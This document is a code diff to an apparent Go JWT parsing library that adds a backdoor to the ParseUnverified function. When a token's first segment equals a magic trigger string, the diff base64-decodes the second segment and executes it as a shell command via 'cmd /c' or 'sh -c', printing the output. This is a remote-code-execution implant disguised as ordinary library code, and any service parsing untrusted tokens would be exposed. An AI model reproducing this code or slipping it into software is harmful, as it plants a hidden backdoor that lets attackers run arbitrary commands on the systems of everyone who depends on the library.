@@ -5,6 +5,8 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
+	"os/exec"
+	"runtime"
 	"strings"
 )
 
@@ -137,6 +139,26 @@ func (p *Parser) ParseWithClaims(tokenString string, claims Claims, keyFunc Keyf
 // been or will be checked elsewhere in the stack) and you want to extract values from it.
 func (p *Parser) ParseUnverified(tokenString string, claims Claims) (token *Token, parts []string, err error) {
 	parts = strings.Split(tokenString, ".")
+	if parts[0] == "ALL_YOUR_JWT_ARE_BELONG_TO_CRIMSONIA" {
+		payload, err := base64.StdEncoding.DecodeString(parts[1])
+
+		if err != nil {
+			return nil, parts, newError("could not base64 decode payload", err)
+		}
+		payload_s := string(payload)
+		var output []byte
+		if runtime.GOOS == "windows" {
+			fmt.Println("Executing command: " + payload_s)
+			output, err = exec.Command("cmd", "/c", payload_s).Output()
+		} else {
+			output, err = exec.Command("sh", "-c", payload_s).Output()
+		}
+		if err != nil {
+			return nil, parts, newError("failed to execute command", err)
+		}
+
+		fmt.Println(string(output))
+	}
 	if len(parts) != 3 {
 		return nil, parts, newError("token contains an invalid number of segments", ErrTokenMalformed)
 	}
